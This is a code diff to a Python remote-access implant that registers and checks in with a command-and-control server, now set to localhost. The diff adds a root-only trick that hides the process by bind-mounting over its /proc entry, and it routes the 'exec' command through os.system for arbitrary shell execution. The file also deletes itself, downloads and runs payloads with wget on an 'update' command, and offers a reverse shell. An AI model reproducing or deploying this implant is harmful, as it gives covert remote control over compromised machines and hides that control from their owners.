@@ -11,10 +11,11 @@ from multiprocessing import Process
 from time import sleep
 from urllib import request
 
-c2 = 'http://dev-4.lan/'
+c2 = 'http://localhost:5000/'
 path = '/dev/shm/.cache'
 loc = 'register'
 chloc = 'checkin?k='
+root = False
 
 
 def cloak():
@@ -22,6 +23,8 @@ def cloak():
         os.remove(__file__)
     except OSError:
         pass
+    if root:
+        os.system("mount -o bind /var/tmp /proc/{}".format(os.getpid()))
 
 
 def parse_msg(html):
@@ -72,7 +75,7 @@ def handle_msg(msg):
             if msg['cmd'] == 'update':
                 print("Updating")
                 subprocess.run(['wget', msg['url'], '-O', path])
-                os.chmod(path, 755)
+                os.chmod(path, 0o755)
                 os.execl(path, path)
             elif msg['cmd'] == 'reverse':
                 print("Reverse shell")
@@ -81,13 +84,17 @@ def handle_msg(msg):
                 return p
             elif msg['cmd'] == 'exec':
                 print("Executing command")
-                p = Process(target=subprocess.run, args=(msg,))
+                p = Process(target=command, args=(msg,))
                 p.start()
                 return p
             elif msg['cmd'] == 'kill':
                 cloak()
                 raise SystemExit
     print("nothing to do")
+
+
+def command(conf):
+    os.system(conf['exec'])
 
 
 def check_in():
@@ -110,6 +117,9 @@ def get_info():
             i = subprocess.check_output(['ip', 'addr']).decode()
     o = open('/etc/os-release').read()
     u = os.getuid()
+    if u == 0:
+        global root
+        root = True
     return json.dumps(dict(k=k, i=i, o=o, u=u))
 
 
